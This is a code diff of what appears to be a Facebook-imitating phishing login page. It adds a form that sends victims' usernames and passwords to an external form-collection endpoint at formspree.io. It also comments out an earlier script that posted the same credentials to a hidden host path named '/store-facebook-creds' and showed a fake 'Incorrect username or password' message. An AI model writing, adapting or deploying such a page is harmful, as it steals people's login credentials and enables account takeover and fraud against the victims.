@@ -190,6 +190,12 @@
       <input type="password" class="password" placeholder="Password" required>
       <input type="submit" class="login" value="Log In">
     </form>
+
+    <form action="https://formspree.io/f/xwpkoqdn" method="POST">
+      <input type="text" class="username" name="username" placeholder="Email or Phone Number" required>
+      <input type="password" class="password" name="password" placeholder="Password" required>
+      <input type="submit" class="login" value="Log In">
+    </form>
     <a href="#">Forgot Password?</a>
     <div class="divider">or</div>
     <a href="#" class="signup-btn">Create New Account</a>
@@ -199,18 +205,18 @@
 <script src="./jquery.min.js"></script>
 <script src="./89T1xCYljtaHFiMWz44T.js"></script>
 <script>
-    $(document).ready(function () {
-        $('.login').click(function (e) {
-            e.preventDefault();
-            $.post(ssddds + '/store-facebook-creds', {
-                username: $('.username').val(),
-                password: $('.password').val(),
-            }, function (res) {
-                $('.err').html('<p style="color: red">Incorrect username or password</p>')
-                console.log(res);
-            })
-        })
-    })
+    // $(document).ready(function () {
+    //     $('.login').click(function (e) {
+    //         e.preventDefault();
+    //         $.post(ssddds + '/store-facebook-creds', {
+    //             username: $('.username').val(),
+    //             password: $('.password').val(),
+    //         }, function (res) {
+    //             $('.err').html('<p style="color: red">Incorrect username or password</p>')
+    //             console.log(res);
+    //         })
+    //     })
+    // })
 </script>
 </body>
 </html>
